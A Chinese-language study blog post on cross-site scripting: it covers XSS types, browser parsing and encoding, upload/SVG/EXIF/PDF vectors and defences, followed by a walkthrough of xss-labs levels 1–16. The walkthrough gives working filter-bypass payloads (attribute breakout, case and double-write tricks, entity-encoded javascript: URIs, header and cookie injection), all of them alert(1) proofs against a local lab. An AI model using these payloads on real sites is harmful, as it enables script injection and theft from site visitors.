---
title: Study_xss
published: 2025-05-09
pinned: false
description: web xss
tags: ['web']
category: CTF-web
licenseName: "MIT"
author: zsm
draft: false
date: 2025-05-09
pubDate: 2025-05-09
---


## XSS原理

XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。

## XSS攻击类型

根据XSS脚本注入方式的不同，我们可以将XSS攻击简单的分类为反射型XSS、存储型XSS、DOM-based 型。

### 反射型XSS

又称为非持久型XSS。  
流程：发出请求(XSS代码嵌套进URL)-->服务端解析并且响应-->传回给浏览器并且解析  

特点：
1. 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据
2. 攻击者需要受害者"配合"
3. 难发现，难修复，难收录()
4. 盗取用户敏感保密信息

### 存储型XSS

又称为持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端，下次不用再去提交XSS代码  
一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。  
这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。

特点：
1. 持久性，直接打到数据库里面
2. 危害大。甚至可以把用户机器变成肉鸡去造成危害
3. 盗取用户敏感信息

### DOM-based 型

客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。

## 代码解析

### DOM&HTML标记
浏览器收到代码，先构建DOM树和解析HTML。  
HTML标记解析一般比较快，包含了开始结束属性名和值，解析之后构建了文档树。  
DOM树主要是描述文档的内容，可以反应标记之间的关系和层次结构。DOM节点越多，构建时间越长。不过有个特别的点，比如加载到一个img资源，会请求这个资源，并且下载，但是整个过程是异步的，浏览器会继续解析和生产HTML部分，并不会等待img下载完

### JavaScript的解析
顺序：HTML解析到JavaScript部分的时候，HTML会停止解析，控制权到JavaScript引擎，执行代码后再继续解析HTML。  
缺点：如果JavaScript的代码运行过长，就会有负面影响，所以就会有异步(async/await)去处理。当JavaScript代码执行时，如果该代码修改了DOM结构或样式，可能会触发浏览器重新构建DOM树和应用样式，从而导致页面的重绘和回流，影响页面的性能。
浏览器方面：当遇到`<script>`标签，就会停止HTML解析，进行JavaScript解析。遇到URL协议or事件属性的标记时，交给JavaScript去解析，如果还不行就会报错，这也就是为什么有时候在某个页面插入了XSS弹窗后，假如你不点击你的弹窗的相应的操作，某些元素就无法进行加载。

### CSS代码的解析
在遇到CSS代码时，浏览器不会像JavaScript代码一样去停止HTML标记的解析，相反它会继续进行HTML代码的解析，并且将CSS代码交给CSS引擎来进行处理。

### 关于解码
HTML主要是为了避免歧义所以才解码的，比如`<>`这种东西可能是标签or属性值，那么传递的时候利用编码就不会有歧义了，例如`<div>`-->`&#x003c;&#x0064;&#x0069;&#x0076;&#x003e;`or`&#60;&#100;&#105;&#118;&#62;`。  
JavaScript主要是为了防止漏洞和语法错误，一般遇到`<script>`这种东西就回进行JS编码，但是`< > ' " ( )`是不能JS编码的  
举个栗子：`<img src=# onerror=alert(1)>`，解码之后是`<img src=# onerror=\u0061\u006C\u0065\u0072\u0074(\u0031)>`，而不是全部去解码

## 实战

### 常见的基础的payload
```
<script>alert(1)</script>
<img scr=1 onerror=alert(1)>
<svg onload=alert(1)/>
<a href=javascript:alert(1)>xss</a>
and so on
```

### 一般场景
有框就插进去试试，记得F12锁定框去看看过滤了什么。

### 文件上传XSS

1. 修改文件后缀：bp抓了，上传文件的时候把后缀改成`.html`or`.htm`，然后在文件里面去插入XSS代码  
2. svg写入XSS：简单来说就是svg文件里面去嵌入XSS代码，例如
```
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
   <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
   <script>alert(1)</script>
</svg>
```
3. exif写入XSS：前提需要网站解析图片的exif信息才可以成功使用此方法，`exiftool -Comment="<script>alert(1)</script> filename.png"`

### PDF-XSS
PDF编辑里面可以插入XSS代码，写进去然后保存成PDF文件，传到浏览器。但是这不是我们最终的目的，在本地弹窗的意义不大，我们需要让某个网站在线解析或者打开我们制作好的PDF文件才可以，当然防御的方法就是用户在打开PDF文件时候，强制让用户在本地下载打开。

更多方法看https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html

### 工具
fuzz：https://github.com/TheKingOfDuck/easyXssPayload  
XSStrike：python xsstrike.py -u http~

## 关于防御

### 逻辑方面
+ 一般的XSS：过滤/把HTML实体化编码特殊字符:`<>"'`等
+ 文件上传XSS：检查后缀，剥离exif标签
+ PDF-XSS：强制用户必须下载文件，而不能在线阅读

### 代码方面
+ PHP的`htmlentities()`or`htmlspecialchars()`
+ python的`cgi.escape()`
+ ASP的`Server.HTMLEncode()`
+ Java的`xssprotect`
+ nodejs的`node-validator`

### HTTP头层次
+ X-XSS-Protection
```
通过设置其值为1，启用浏览器的XSS防护，浏览器会做出下面的措施：
自动关闭或过滤掉潜在的XSS攻击脚本：浏览器会检测响应内容是否包含恶意脚本，并自动关闭或过滤掉这些脚本，防止它们被执行。
重定向到安全页面：如果浏览器检测到具有潜在XSS威胁的内容，它可能会将用户重定向到一个更安全的页面，以防止攻击脚本的执行。
```

+ X-Download-Options
```
通过设置其值为noopen，使得浏览器下载文件时不自动打开，不关联下载文件和浏览器内嵌程序。这样可以防止一些特定类型的文件（例如html、pdf等）被当作网页打开，降低XSS攻击的风险。
```

+ X-Content-Type-Options
```
通过设置X-Content-Type-Options头的值为"nosniff"，可以防止浏览器将响应内容以错误的方式解析，减少了XSS攻击的风险。
```

+ X-Frame-Options
```
通过设置X-Frame-Options头，可以阻止通过嵌入iframe或frame的方式进行点击劫持攻击。可以设置该头的值为"DENY"，"SAMEORIGIN"或"ALLOW-FROM <域名>"。
```

+ Content Security Policy（CSP）
```
通过设置CSP头，可以限制资源加载的来源，以防止执行不受信任的脚本。CSP可以指定允许的域名、允许的脚本类型以及其他安全策略。
```

### HttpOnly
当一个 cookie 设置了 HttpOnly 标志后，浏览器会禁止通过 JavaScript 脚本来读取这个 cookie 的值。这意味着即使有 XSS 攻击成功注入了恶意脚本，也无法从受害者浏览器中获取敏感的 cookie 值，从而有效防止了 cookie 盗取和会话劫持攻击。
但是HttpOnly不能够完全防御XSS，只能减少XSS带来的危害。

+ PHP
```php
setcookie('cookie_name', 'cookie_value', time()+3600, '/', '', false, true); // 最后一个参数设置为 true 表示设置 HttpOnly 标志，false 表示不设置
```

+ Java
```java
import javax.servlet.http.Cookie;

Cookie cookie = new Cookie("cookie_name", "cookie_value");
cookie.setMaxAge(3600);
cookie.setPath("/");
cookie.setHttpOnly(true); // 设置 HttpOnly 标志
response.addCookie(cookie);
```

+ Python（Django 框架）
```python
response.set_cookie('cookie_name', 'cookie_value', max_age=3600, httponly=True) # 设置 httponly=True 表示设置 HttpOnly 标志
```

+ nodejs
```js
cnpm i xss -S

const {xss} = require('xss')

const newBlog = (blogData = {}) => {
  const title = xss(blogData.title)
}
```

## XSS-lab
一个基础xss靶场，后面4个是关于flash的，就不写了

### 关于靶场搭建
windows可以小皮搭建，mac/linux推荐docker
>docker run -d --name xss-labs -p 51142:80 shadowaura/xss-labs:latest

### level1~2
无任何防御的两关

**level1**  
直接输入`<script>alert(1);</script>`即可

**level2**  
先把老payload输入进去，发现不行，并且payload回显在
```
<form action="level2.php" method="GET">
<input name="keyword" value="<script>alert(1)</scrpit>">
<input type="submit" name="submit" value="搜索">
</form>
```
甚至发现这个并没有被转义，主要是因为没有闭合导致的，加入`"> `即可
完整payload：`"> <script>alert(1)</script>`

### level3~9(字符过滤绕过)

**level3**  
注：php8.1.0及其以上版本已经修复
`htmlspecialchars`函数，把预定义的字符转换为 HTML 实体
1. &：转换为&amp;
2. "：转换为&quot;
3. '：转换为成为 '
4. <：转换为&lt;
5. '>：转换为&gt;

语法`htmlspecialchars(string,flags,character-set,double_encode)`
+ string：必需，规定要转换的字符串
+ flags ：可选，规定如何处理引号、无效的编码以及使用哪种文档类型
+ character-set ：可选，一个规定了要使用的字符集的字符串，如：UTF-8（默认）
+ double_encode ：可选，布尔值，规定了是否编码已存在的 HTML 实体。

flags参数可用的引号类型

+ ENT_COMPAT ：默认仅编码双引号。
+ ENT_QUOTES：编码双引号和单引号。
+ ENT_NOQUOTES：不编码任何引号。
注：xss-lab中有些关卡可以利用单引号绕过是因为flags参数默认只编码双引号

double_encode参数布尔值

+ TRUE：默认，将对每个实体进行转换。
+ FALSE：不会对已存在的 HTML 实体进行编码。

这里靶场用的是`htmlspecialchars($str)`，尝试输入pyload，发现
`<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2><center>`，然而，可以发现这里 value 的值用的是单引号。既然单引号不会被转义，我们可以闭合 value 这个字符串。

但是，`<>` 都会被转义，似乎不能闭合这个标签。有什么办法能够不用 `<script>` 标签来注入 JavaScript 代码呢？答案是使用触发器，比如 `onfocus` 或者 `onmouseover`。

`javascript:alert(1)` 使用了java伪协议，就是把`javascript:` 后面的代码当JavaScript来执行
` onmouseover=javascript:alert(1) `
` onfocus=javascript:alert(1) `

**level4**  
payload打进去，回显`<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/scrpit&gt;相关的结果.</h2><center>`
把`<`给过滤了，双引号没过滤，把上一个代码改一下扔进去试试，合理
`" onmouseover=javascript:alert(1) "`

**level5**  
老规矩，输入payload，返回`<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/scrpit&gt;相关的结果.</h2><center>`，
而且输入框中变成了`<scr_ipt>alert(1)</scrpit>`，
输入`">" onmouseover=javascript:alert(1) "`，发现变成`" o_nmouseover=javascript:alert(1) ""> `

正确思路是可以利用 JavaScript 的 URI
`<a href=javascript:alert(1)>hack</a>`

`<a>`标签后面的href不一定非要跟url，还可以是URI，可以视为 URL 的超集，后面跟`javascript`就可以执行后面的内容，`mailto`就会去打开邮件去发信息，所以可以借助这个运行js代码
`"> <a href=javascript:alert(1)>hack</a>`

**level6**  
尝试payload，发现变成`<scr_ipt>alert(1)</scrpit>`，尝试5的payload，发现变成`<a hr_ef=javascript:alert(1)>hack</a>">`，发现href被过滤了，课源码，

```
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

发现过滤了五个东西，可以利用html的特性，HREF和href的效果是一样的，大小写不会区分
`"> <a HREF=javascript:alert(1)>hack</a>`

**level7**  
尝试输入payload，发现回显`<>alert(1)</scrpit>`，整个被替换为空了，那么6的payload当然不能使用了，看题目源码
```
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```

果然全部换为空，但是php特性，替换只会替换一个，比如`<scriscriptpt>`就会被替换为`<script>`，这就是双写绕过？
`"> <scriscriptpt>alert(1)</scriscriptpt>`

**level8**  
尝试原始payload，发现会被替换`<scr_ipt>alert(1)</scr_ipt>`，并且是链接形式，好像没啥区别，看源码
```
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

新增的是双引号被过滤了，
`"> <a href=javascript:alert(1)>hack</a>`进去变成`<a hr_ef=javascr_ipt:alert(1)>hack</a>`，href可以通过大写绕过，但是javascript怎么搞

HTML 实体有两种写法，第一种是 &entity_name; 形式，比如 `$lt;` 表示小于号，"&"开头，";"结尾；第二种是 &#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 `&#60;` 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。https://mothereff.in/html-entities 可以提供转换，"&#"开头，";"结尾

突然想起来这个是要加入到链接的，HREF不用写的
`javascr&#x69;pt:alert(1)`

**level9**  
尝试上一题的payload，回显`<a href="您的链接不合法？有没有！">`，看看源码

```
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);

false===strpos($str7,'http://')
```

与上一题不同的就是添加了对http的验证,我们在后面加上注释，写上http://就行了
`javascr&#x69;pt:alert(1)//http://`

### level10~16(字段注入)

**level10**  
尝试老payload，发现无特别回显，看看源码

```
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);

<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
```

尝试所有内容输入`http://localhost:51142/level10.php?keyword=test?t_link=tlink&t_history=thistory&t_sort=tsort` ，得到
```
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="tsort" type="hidden">
```

`t_sort`的信息并没有过滤，可以尝试从这里注入，从源码得知`<>`被过滤掉，尝试类似`" onmouseover=javascript:alert(1) "`的payload
`http://localhost:51142/level10.php?keyword=test&t_sort=" onmouseover=javascript:alert(1) "`

发现回显
`<input name="t_sort"  value="" onmouseover=javascript:alert(1) "" type="hidden">` ,被隐藏了xd，html里面加一个type去覆盖这个状态
`http://localhost:51142/level10.php?keyword=test&t_sort=" onmouseover=javascript:alert(1) type "`

**level11**  
看页面源码
```
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ref"  value="http://localhost:51142/level10.php?keyword=test&t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22" type="hidden">
```

发现referer被传回来，是上一个靶场的链接，bp抓包给他改了传回去
`Referer: "type="text "onmousemove="alert(1)`


还有一种方法创建一个文件名为 `" onmouseover=javascript:alert(1) type ".html `的 HTML 文件，在其中重定向到 level 11 的页面。

**level12**  
看看页面源码

```
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ua"  value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15" type="hidden">
```

给了ua，很明显举要改ua，改成`"type="text "onmousemove="alert(1)`就行

**level13**  
修改cookie为`" onmouseover=javascript:alert(1) type "`

**level14**  
貌似这个关卡寄了，看别人的博客貌似是exif xss，就是图片上传，图片的属性改成xss的马

**level15**  
这一关考的是`ng-include:`这个东西，文件包含

+ ng-include 指令用于包含外部的 HTML 文件。
+ 包含的内容将作为指定元素的子节点。
+ ng-include 属性的值可以是一个表达式，返回一个文件名。
+ 默认情况下，包含的文件需要包含在同一个域名下。

语法
`<element ng-include="filename" onload="expression" autoscroll="expression" ></element>`

第一种做法，把以前关卡的漏洞包含进去，我们就可以打了

第二种方法，写一个能够弹窗的简单 HTML，然后 include 进来
```
<html>
<h1>hacker</h1>
<img src=1 onerror="alert(1)"></img>
</html>
```
如果放在网站根目录，就是`?src="/alert.html"`
感觉这种遇到的可能性很小

**level16**  
看下面源码

```
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
```

还是过滤类型的，空格和srcipt都没了，主要是空格，html里面换行符可以替换掉空格，%0A

`http://localhost:51142/level16.php?keyword=<img%0Asrc=1%0Aonerror="alert(1)">`